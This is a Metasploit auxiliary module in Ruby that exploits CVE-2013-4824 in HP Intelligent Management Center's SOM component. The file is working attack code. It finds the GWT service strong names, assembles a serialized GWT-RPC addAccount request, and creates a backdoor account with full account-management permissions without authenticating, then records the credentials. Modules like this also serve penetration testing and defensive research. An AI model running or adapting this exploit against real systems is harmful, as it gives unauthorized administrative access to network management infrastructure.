##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP Intelligent Management SOM Account Creation',
      'Description'    => %q{
        This module exploits a lack of authentication and access control in HP Intelligent
        Management, specifically in the AccountService RpcServiceServlet from the SOM component,
        in order to create a SOM account with Account Management permissions. This module has
        been tested successfully on HP Intelligent Management Center 5.2 E0401 and 5.1 E202 with
        SOM 5.2 E0401 and SOM 5.1 E0201 over Windows 2003 SP2.
      },
      'References'     =>
        [
          [ 'CVE', '2013-4824' ],
          [ 'OSVDB', '98249' ],
          [ 'BID', '62902' ],
          [ 'ZDI', '13-240' ],
          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03943547' ]
        ],
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Oct 08 2013"
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('USERNAME', [true, 'Username for the new account', 'msf']),
        OptString.new('PASSWORD', [true, 'Password for the new account', 'p4ssw0rd'])
      ], self.class)
  end

  def get_service_desk_strong_name
    res = send_request_cgi({
      'uri'    => normalize_uri("servicedesk", "servicedesk", "servicedesk.nocache.js"),
      'method' => 'GET'
    })

    if res and res.code == 200 and res.body =~ /unflattenKeylistIntoAnswers\(\['default', 'safari'\], '([0-9A-Fa-f]+)'\);/
      return $1
    end

    return nil
  end

  def get_account_service_strong_name(service_desk)
    res = send_request_cgi({
      'uri'    => normalize_uri("servicedesk", "servicedesk", "#{service_desk}.cache.html"),
      'method' => 'GET'
    })

    if res and res.code == 200 and res.body =~ /'accountSerivce.gwtsvc', '([0-9A-Fa-f]+)', SERIALIZER_1/
      return $1
    end

    return nil
  end

  def run

    print_status("#{peer} - Trying to find the service desk service strong name...")
    service_desk = get_service_desk_strong_name
    if service_desk.nil?
      print_error("#{peer} - service desk service not found.")
      return
    end
    print_good("#{peer} - service desk strong number found: #{service_desk}")

    print_status("#{peer} - Trying to find the AccountService strong name...")
    account_service = get_account_service_strong_name(service_desk)
    if account_service.nil?
      print_error("#{peer} - AccountService service not found.")
      return
    end
    print_good("#{peer} - AccountService strong number found: #{account_service}")

    header= "6|0|39" # version | unknown | string_table size

    # Used to parse the payload
    string_table = [
      "http://localhost:8080/servicedesk/servicedesk/",                         # 1  servlet URL
      "#{account_service}",                                                     # 2  AccountService strong name
      "com.h3c.imc.eu.client.account.AccountService",                           # 3  GWT Service Class
      "addAccount",                                                             # 4  GWT Service Method
      "com.extjs.gxt.ui.client.data.BaseModelData/3541881726",                  # 5  BaseModelData Type
      "com.extjs.gxt.ui.client.data.RpcMap/3441186752",                         # 6  RpcMap Type
      "isAccount",                                                              # 7  isAccount Field
      "java.lang.Boolean/476441737",                                            # 8  Boolean Type
      "ssName",                                                                 # 9  ssName Field
      "java.lang.String/2004016611",                                            # 10 String Type
      datastore["USERNAME"],                                                    # 11 ssName Value
      "authType",                                                               # 12 authType Field
      "java.lang.Integer/3438268394",                                           # 13 Integer Type
      "ssPassword",                                                             # 14 ssPassword Field
      datastore["PASSWORD"],                                                    # 15 ssPassword value
      "accountGroups",                                                          # 16 accountGroups Field
      "java.util.ArrayList/3821976829",                                         # 17 ArayList Type
      "permissions",                                                            # 18 permissions Field
      "iMC-SOM-SERVICEDESK",                                                    # 19 permissions Value
      "iMC-SOM-SERVICEDESK.PROCTASK",                                           # 20 permissions Value
      "iMC-SOM-SERVICEDESK.ACCT",                                               # 21 permissions Value
      "iMC-SOM-SERVICEDESK.ACCT.VIEW",                                          # 22 permissions Value
      "iMC-SOM-SERVICEDESK.ACCT.ADD",                                           # 23 permissions Value
      "iMC-SOM-SERVICEDESK.ACCT.MOD",                                           # 24 permissions Value
      "iMC-SOM-SERVICEDESK.ACCT.DEL",                                           # 25 permissions Value
      "userName",                                                               # 26 userName Field
      "certification",                                                          # 27 certification Field
      "userGroupId",                                                            # 28 userGroupId Field
      "java.lang.Long/4227064769",                                              # 29 Long Type
      "userGroupName",                                                          # 30 userGroupName Field
      "Ungrouped",                                                              # 31 userGroupName Value
      "userGroupDescription",                                                   # 32 userGroupDescription Field
      "Ungrouped User.This record is generated by system, can not be deleted.", # 33 userGroupDescription Value
      "address",                                                                # 34 address Field
      "",                                                                       # 35 address Value
      "phone",                                                                  # 36 phone Field
      "email",                                                                  # 37 email Field
      "userAppendInfo",                                                         # 38 userAppendInfo Field
      "java.util.HashMap/962170901"                                             # 39 HashMap Type
    ].join("|")

    payload = [
      "1",  # servlet URL
      "2",  # strong name
      "3",  # GWT Service Class
      "4",  # GWT Service Method (addAccount)
      "1",  # number of method parameters (addAccount has 1 parameter)
      "5",  # parameter type (BaseModelData)
      "5",  # read BaseModelData
      "1",  # read 1 object into the BaseModelData
      "6",  # read RpcMap
      "15", # read 15 objects into the RpcMap
      "7",  # RpcMap[0] => isAccount
      "8",  # isAccount Type (Boolean)
      "1",  # isAccount Value (true)
      "9",  # RpcMap[1] => ssName
      "10", # ssName Type (String)
      "11", # ssName Value
      "12", # RpcMap[2] => authType
      "13", # authType Type
      "0",  # authType Value (0 => password)
      "14", # RpcMap[3] => ssPassword
      "10", # ssPassword Type (String)
      "15", # ssPassword Value
      "16", # RpcMap[4] => accountGroups
      "17", # accountGroups Type (ArrayList)
      "0",  # accountGroups size (0)
      "18", # RpcMap[5] => permissions
      "17", # permissions Type (ArrayList)
      "7",  # permissions size (7)
      "10", # permissions[0] Type (String)
      "19", # permissions[0] Value (iMC-SOM-SERVICEDESK)
      "10", # permissions[1] Type (String)
      "20", # permissions[1] Value (iMC-SOM-SERVICEDESK.PROCTASK)
      "10", # permissions[2] Type (String)
      "21", # permissions[2] Value (iMC-SOM-SERVICEDESK.ACCT)
      "10", # permissions[3] Type (String)
      "22", # permissions[3] Value (iMC-SOM-SERVICEDESK.ACCT.VIEW)
      "10", # permissions[4] Type (String)
      "23", # permissions[4] Value (iMC-SOM-SERVICEDESK.ACCT.ADD)
      "10", # permissions[5] Type (String)
      "24", # permissions[5] Value (iMC-SOM-SERVICEDESK.ACCT.MOD)
      "10", # permissions[6] Type (String)
      "25", # permissions[6] Value (iMC-SOM-SERVICEDESK.ACCT.DEL)
      "26", # RpcMap[6] => username
      "-4", # username Type - not provided
      "27", # RpcMap[7] => certification
      "-4", # certification Type - not provided
      "28", # RpcMap[8] => userGroupId
      "29", # userGroupId Type (Long)
      "B",  # userGroupId Value - not provided
      "30", # RpcMap[9] => userGroupName
      "10", # userGroupName Type (String)
      "31", # userGroupName Value (Ungrouped)
      "32", # RpcMap[10] => userGroupDescription
      "10", # userGroupDescription Type (String)
      "33", # userGroupDescription Value (Ungrouped User.This record is generated by system, can not be deleted.)
      "34", # RpcMap[11] => address
      "10", # address Type (String)
      "35", # address Value ("")
      "36", # RpcMap[12] => phone
      "-19",# phone Type - not provided
      "37", # RpcMap[13] => email
      "-19",# email Type - not provided
      "38", # RpcMap[14] => userAppendInfo
      "39", # userAppendInfo Type (HashMap)
      "0"   # userAppendInfo HashMap size (0)
    ].join("|")

    gwt_request = [header, string_table, payload].join("|")
    gwt_request << "|" # end

    service_url = ssl ? "https://" : "http://"
    service_url << "#{rhost}:#{rport}/servicedesk/servicedesk/"

    print_status("#{peer} - Trying to create account #{datastore["USERNAME"]}...")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri("servicedesk", "servicedesk", "accountSerivce.gwtsvc"),
      'ctype'  => 'text/x-gwt-rpc; charset=UTF-8',
      'headers' => {
        "X-GWT-Module-Base" => service_url,
        "X-GWT-Permutation" => "#{service_desk}"
      },
      'data'   => gwt_request
    })

    unless res and res.code == 200
      print_error("#{peer} - Unknown error while creating the user.")
      return
    end

    if res.body =~ /Username.*already exists/
      print_error("#{peer} - The user #{datastore["USERNAME"]} already exists.")
      return
    elsif res.body =~ /Account.*added successfully/
      login_url = ssl ? "https://" : "http://"
      login_url << "#{rhost}:#{rport}/servicedesk/ServiceDesk.jsp"

      report_auth_info({
        :host => rhost,
        :port => rport,
        :user => datastore["USERNAME"],
        :pass => datastore["PASSWORD"],
        :type => "password",
        :sname => (ssl ? "https" : "http"),
        :proof => "#{login_url}\n#{res.body}"
      })
      print_good("#{peer} - Account #{datastore["USERNAME"]}/#{datastore["PASSWORD"]} created successfully.")
      print_status("#{peer} - Use it to log into #{login_url}")
    end
  end

end
